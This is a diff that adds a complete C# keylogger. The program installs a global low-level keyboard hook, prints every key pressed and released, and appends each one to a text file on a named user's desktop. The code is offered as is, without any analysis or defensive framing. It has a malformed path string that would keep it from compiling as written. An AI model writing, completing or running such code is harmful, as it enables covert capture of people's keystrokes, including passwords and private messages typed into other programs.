@@ -1,0 +1,71 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+class Program
+{
+    private const int WH_KEYBOARD_LL = 13;
+
+    [STAThread]
+    public static void Main(string[] args)
+    {
+        using (var keyLogger = new KeyLogger())
+        {
+            Application.Run(); // Message loop required for global hooks
+        }
+    }
+
+    class KeyLogger : IDisposable
+    {
+        private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
+
+        private HookProc _hookProc;
+        private IntPtr _hModule;
+        private IntPtr _hookHandle;
+
+        public KeyLogger()
+        {
+            _hookProc = new HookProc(HookCallback);
+            _hModule = GetModuleHandle(null);
+            _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, _hModule, 0);
+        }
+
+        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP) && lParam != IntPtr.Zero)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                Keys key = (Keys)vkCode;
+                Console.WriteLine(key.ToString());
+                File.AppendAllText("C:\\Users\\deni\\Desktop\\loger.txt\", key.ToString() + Environment.NewLine);
+            }
+            return CallNextHookEx(_hookHandle, nCode, wParam, lParam);
+        }
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        public void Dispose()
+        {
+            if (_hookHandle != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(_hookHandle);
+                _hookHandle = IntPtr.Zero;
+            }
+        }
+
+        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    }
+}
